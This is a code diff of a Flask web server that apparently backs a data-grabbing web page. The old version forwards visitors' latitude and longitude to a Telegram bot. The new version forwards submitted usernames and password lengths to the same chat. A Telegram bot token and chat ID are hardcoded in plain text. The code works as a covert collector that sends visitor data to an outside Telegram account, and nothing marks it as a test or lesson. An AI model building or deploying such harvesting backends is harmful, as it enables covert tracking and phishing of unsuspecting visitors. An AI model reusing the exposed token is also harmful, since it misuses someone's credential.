@@ -1,64 +1,49 @@
- 
-
-
-
-from flask import Flask, request, send_file
+from flask import Flask, request, jsonify, render_template
 from flask_cors import CORS
 import requests
-
+import os
 
 app = Flask(__name__)
 CORS(app)
-
 
 BOT_TOKEN = "8941028344:AAEYsRq2psDO5o5CCxYIM7Q_z9ryE9s6PZo"
 CHAT_ID = "1584744130"
 
 
+
 @app.route("/")
 def home():
-    return send_file("index.html")
+    return render_template("index.html")
 
 
-
-@app.route("/location", methods=["POST"])
-def location():
+@app.route("/send", methods=["POST"])
+def send():
 
     data = request.json
 
-    lat = data["latitude"]
-    lon = data["longitude"]
+    print(data)
 
+    message = f"""
+New message
 
-    print("Location:", lat, lon)
+Username: {data.get('username')}
+Password length: {data.get('passwordLength')}
+"""
 
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
 
-    telegram_url = (
-        f"https://api.telegram.org/"
-        f"bot{BOT_TOKEN}/sendLocation"
-    )
-
-
-    response = requests.post(
-        telegram_url,
-        json={
-            "chat_id": CHAT_ID,
-            "latitude": lat,
-            "longitude": lon
-        }
-    )
-
+    response = requests.post(url, json={
+        "chat_id": CHAT_ID,
+        "text": message
+    })
 
     print(response.text)
 
-
-    return "Location received"
-
+    return jsonify({
+        "status": "ok"
+    })
 
 
 if __name__ == "__main__":
-
-    app.run(
-        host="0.0.0.0",
-        port=5000
-    )
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
